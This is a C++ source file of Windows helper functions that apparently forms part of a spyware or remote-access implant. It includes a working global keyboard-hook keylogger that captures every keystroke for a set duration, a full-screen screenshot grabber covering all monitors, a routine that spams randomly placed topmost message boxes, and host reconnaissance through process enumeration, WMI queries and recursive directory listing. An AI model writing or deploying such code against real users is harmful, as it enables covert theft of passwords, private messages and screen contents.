#include <cstdlib>
#include <thread>
#include <Windows.h>
#include <tlhelp32.h>
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

#include "AutoHandle.h"
#include "WinUtils.h"

#include <fstream>

#include "AutoWbemObject.h"
#include "ComInitializer.h"
#include "FileInfo.h"
#include "Utils/Strings.h"
#include "Utils/Uuid.h"

bool windows::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
{
	if (!MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags)) {
		return false;
	}
	return true;
}

void windows::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
{
	// Get the screen dimensions
	const int screen_width = GetSystemMetrics(SM_CXSCREEN);
	const int screen_height = GetSystemMetrics(SM_CYSCREEN);

	for (size_t i = 0; i < count; ++i) {
		// Generate random positions for the message box
		int x_pos = uuid::rand_int(0, screen_width - 200); // 200 is an arbitrary width of the MessageBox
		int y_pos = uuid::rand_int(0, screen_height - 100); // 100 is an arbitrary height of the MessageBox

		// Create the message box in a new thread to avoid blocking the loop
		std::thread t([window_name, text, flags, x_pos, y_pos](const LPVOID param) -> DWORD
		              {
			              RECT rect;
			              GetWindowRect(static_cast<HWND>(param), &rect);
			              SetWindowPos(static_cast<HWND>(param), HWND_TOPMOST, x_pos, y_pos, 0, 0,
			                           SWP_NOSIZE | SWP_NOACTIVATE);
			              MessageBoxA(static_cast<HWND>(param), text.c_str(), window_name.c_str(),
			                          flags | MB_SETFOREGROUND);
			              return 0;
		              },
		              nullptr);
		t.detach();

		// Small delay between creating message boxes
		std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_POPUPS_MILLIS));
	}
	std::this_thread::sleep_for(std::chrono::seconds(1));
}

std::string windows::take_screenshot()
{
	// Get the desktop device context (DC) of the entire virtual screen
	const HDC h_screen_dc = GetDC(nullptr);
	const HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);

	// Get the dimensions of the virtual screen (covers all monitors)
	const int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	const int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	const int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
	const int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);

	// Create a compatible bitmap from the screen DC
	const HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);

	// Select the compatible bitmap into the compatible memory DC
	const auto h_old_bitmap = static_cast<HBITMAP>(SelectObject(h_memory_dc, h_bitmap));

	// Bit block transfer into our compatible memory DC
	BitBlt(h_memory_dc, 0, 0, screen_width, screen_height, h_screen_dc, screen_left, screen_top, SRCCOPY);

	// Get the bitmap information
	BITMAP bmp;
	GetObject(h_bitmap, sizeof(BITMAP), &bmp);

	// Calculate the stride (row size) of the bitmap
	const int row_size = (bmp.bmWidth * bmp.bmBitsPixel + 31) / 32 * 4;

	// Bitmap file header
	BITMAPFILEHEADER file_header;
	BITMAPINFOHEADER info_header;

	// Fill the file header
	file_header.bfType = 0x4D42; // "BM"
	file_header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	file_header.bfSize = file_header.bfOffBits + row_size * bmp.bmHeight;
	file_header.bfReserved1 = 0;
	file_header.bfReserved2 = 0;

	// Fill the info header
	info_header.biSize = sizeof(BITMAPINFOHEADER);
	info_header.biWidth = bmp.bmWidth;
	info_header.biHeight = bmp.bmHeight;
	info_header.biPlanes = 1;
	info_header.biBitCount = bmp.bmBitsPixel;
	info_header.biCompression = BI_RGB;
	info_header.biSizeImage = 0;
	info_header.biXPelsPerMeter = 0;
	info_header.biYPelsPerMeter = 0;
	info_header.biClrUsed = 0;
	info_header.biClrImportant = 0;

	// Allocate buffer for bitmap file
	std::string bmp_buffer(file_header.bfSize, '\0');

	// Copy headers
	std::copy_n(reinterpret_cast<char*>(&file_header), sizeof(BITMAPFILEHEADER), bmp_buffer.data());
	std::copy_n(reinterpret_cast<char*>(&info_header), sizeof(BITMAPINFOHEADER),
	            bmp_buffer.data() + sizeof(BITMAPFILEHEADER));

	// Copy bitmap data
	GetDIBits(h_memory_dc, h_bitmap, 0, bmp.bmHeight, bmp_buffer.data() + file_header.bfOffBits,
	          reinterpret_cast<BITMAPINFO*>(&info_header), DIB_RGB_COLORS);

	// Cleanup
	SelectObject(h_memory_dc, h_old_bitmap);
	DeleteObject(h_bitmap);
	DeleteDC(h_memory_dc);
	ReleaseDC(nullptr, h_screen_dc);

	// Convert the buffer to a string
	return bmp_buffer;
}

BOOL windows::get_message_with_timeout(MSG* msg, const unsigned int timeout)
{
	const UINT_PTR timer_id = SetTimer(nullptr, 0, timeout, nullptr);
	const BOOL res = GetMessage(msg, nullptr, 0, 0);
	KillTimer(nullptr, timer_id);
	if (!res)
		return FALSE;
	if (msg->message == WM_TIMER && msg->hwnd == nullptr && msg->wParam == timer_id)
		return FALSE;
	return TRUE;
}

std::string windows::log_keys(const unsigned int duration_seconds)
{
	g_key_logger_key_codes.clear();
	const HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, log_keys_hook, nullptr, 0);

	MSG msg;
	get_message_with_timeout(&msg, duration_seconds * 1000);

	UnhookWindowsHookEx(hook_handle);

	std::string result;
	for (const DWORD val : g_key_logger_key_codes) {
		result.append(std::string(1, static_cast<char>(val)));
	}
	return result;
}

LRESULT CALLBACK windows::log_keys_hook(const int n_code, const WPARAM w_param, const LPARAM l_param)
{
	if (n_code == HC_ACTION) {
		switch (w_param) {
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			g_key_logger_key_codes.push_back(reinterpret_cast<PKBDLLHOOKSTRUCT>(l_param)->vkCode);
			break;
		default: break;
		}
	}
	return false; // don't consume event
}

bool windows::is_process_running(const std::string& name)
{
	const AutoHandle h_process_snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
	if (h_process_snap.get() == INVALID_HANDLE_VALUE) {
		return false;
	}
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(h_process_snap.get(), &pe32)) {
		return false;
	}
	do {
		if (std::wstring(pe32.szExeFile) == strings::to_wstring(name)) {
			return true;
		}
	}
	while (Process32Next(h_process_snap.get(), &pe32));
	return false;
}

std::string windows::read_file(const std::filesystem::path& path)
{
	const std::ifstream f(path);
	if (!f) {
		throw std::runtime_error("Couldn't open file " + path.string());
	}
	std::ostringstream ss;
	ss << f.rdbuf(); // reading data
	return ss.str();
}

ResourceBinaryView windows::get_binary_resource(const DWORD resource_id)
{
	return ResourceBinaryView(MAKEINTRESOURCE(resource_id));
}

std::string windows::get_textual_resource(const DWORD resource_id)
{
	const auto conf_resource = get_binary_resource(resource_id);
	std::string resource_text(conf_resource.data(), conf_resource.data() + conf_resource.size());
	return resource_text;
}

bool windows::exists_event(const std::string_view& event_name)
{
	const AutoHandle h_event(OpenEventA(READ_CONTROL, false, event_name.data()));
	return nullptr != h_event.get();
}

std::unique_ptr<windows::AutoHandle> windows::create_event(const std::string_view& event_name, const bool manual_reset)
{
	auto h_event = std::make_unique<AutoHandle>(CreateEventA(nullptr, manual_reset, true, event_name.data()));
	if (nullptr == h_event->get()) {
		const auto error = GetLastError();
		throw std::runtime_error("Failed to create event. Error: " + std::to_string(error));
	}
	return std::move(h_event);
}

void windows::signal_event(const HANDLE h_event)
{
	if (!SetEvent(h_event)) {
		const auto error = GetLastError();
		throw std::runtime_error("Failed to signal event. Error: " + std::to_string(error));
	}
}

json windows::query_wmi(const std::wstring& wmi_class, const std::vector<std::wstring>& properties)
{
	nlohmann::json result;

	IWbemLocator* p_loc = nullptr;
	IWbemServices* p_svc = nullptr;
	const ComInitializer com(COINIT_MULTITHREADED);

	// Set security levels
	HRESULT res = CoInitializeSecurity(
		nullptr,
		-1,
		nullptr,
		nullptr,
		RPC_C_AUTHN_LEVEL_DEFAULT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		nullptr,
		EOAC_NONE,
		nullptr
	);

	if (FAILED(res)) {
		throw std::runtime_error("Failed to initialize security. Error: " + std::to_string(res));
	}

	// Create WMI locator
	res = CoCreateInstance(
		CLSID_WbemLocator,
		nullptr,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, reinterpret_cast<LPVOID*>(&p_loc));

	if (FAILED(res)) {
		throw std::runtime_error("Failed to create IWbemLocator object. Error: " + std::to_string(res));
	}

	// Connect to WMI
	res = p_loc->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"),
		nullptr,
		nullptr,
		nullptr,
		0,
		nullptr,
		nullptr,
		&p_svc
	);
	AutoWbemObject guard_p_loc(p_loc);

	if (FAILED(res)) {
		throw std::runtime_error("Could not connect. Error: " + std::to_string(res));
	}

	// Set security levels on the proxy
	res = CoSetProxyBlanket(
		p_svc,
		RPC_C_AUTHN_WINNT,
		RPC_C_AUTHZ_NONE,
		nullptr,
		RPC_C_AUTHN_LEVEL_CALL,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		nullptr,
		EOAC_NONE
	);
	AutoWbemObject guard_p_svc(p_svc);

	if (FAILED(res)) {
		throw std::runtime_error("Could not set proxy blanket. Error: " + std::to_string(res));
	}

	// Query WMI
	IEnumWbemClassObject* p_enumerator = nullptr;
	res = p_svc->ExecQuery(
		bstr_t("WQL"),
		bstr_t((L"SELECT * FROM " + wmi_class).c_str()),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		nullptr,
		&p_enumerator
	);
	AutoWbemObject guard_p_enumerator(p_enumerator);
	if (FAILED(res)) {
		throw std::runtime_error(
			"Query for " + strings::to_string(wmi_class) + " failed. Error: " + std::to_string(res));
	}

	// Get data from the query
	IWbemClassObject* cur_wbem_obj = nullptr;
	ULONG u_return = 0;

	while (p_enumerator) {
		HRESULT hr = p_enumerator->Next(WBEM_INFINITE, 1, &cur_wbem_obj, &u_return);
		if (u_return == 0) {
			break;
		}
		AutoWbemObject guard_cur_wbem_obj(cur_wbem_obj);

		// Extract properties
		for (const auto& prop : properties) {
			VARIANT vt_prop;
			hr = cur_wbem_obj->Get(prop.c_str(), 0, &vt_prop, nullptr, nullptr);
			if (SUCCEEDED(hr)) {
				// Ensure the property is valid and check the type before processing
				if (vt_prop.vt == VT_BSTR) {
					result[std::string(prop.begin(), prop.end())] = _bstr_t(vt_prop.bstrVal);
				}
				else if (vt_prop.vt == VT_I4) {
					result[std::string(prop.begin(), prop.end())] = vt_prop.intVal;
				}
				else if (vt_prop.vt == VT_UI4) {
					result[std::string(prop.begin(), prop.end())] = vt_prop.uintVal;
				}
				else if (vt_prop.vt == VT_R8) {
					result[std::string(prop.begin(), prop.end())] = vt_prop.dblVal;
				}
				// Add more cases for other data types as necessary
			}
			res = VariantClear(&vt_prop);
			if (FAILED(res)) {
				throw std::runtime_error("Failed to clear property variant. Error: " + std::to_string(res));
			}
		}
	}
	return result;
}

std::vector<std::unique_ptr<windows::FileInfo>> windows::recurse_dir(const std::filesystem::path& path,
                                                                     const unsigned int depth)
{
	std::vector<std::unique_ptr<FileInfo>> result;

	// Check if the path exists and is a directory
	if (!exists(path) || !is_directory(path)) {
		throw std::invalid_argument(
			"Failed to recurse dir: path '" + strings::to_string(path.wstring()) + "' doesn't exist or is a file");
	}

	// A lambda function for recursive traversal
	std::function<void(const std::filesystem::path&, unsigned int)> traverse = [&
		](const std::filesystem::path& current_path, const unsigned int current_depth)
	{
		if (current_depth > depth) return; // Stop recursion when the depth limit is reached

		// Iterate over the directory entries
		try {
			for (const auto& entry : std::filesystem::directory_iterator(current_path)) {
				result.push_back(std::make_unique<FileInfo>(entry.path()));

				if (is_directory(entry.status()) && current_depth < depth) {
					traverse(entry.path(), current_depth + 1);
				}
			}
		}
		catch (const std::exception& ex) {
			// Skip "Access is denied" error for files or directories we can't access, instead of crashing the entire function
		}
	};

	traverse(path, 0); // Start traversal from the root path
	return result;
}
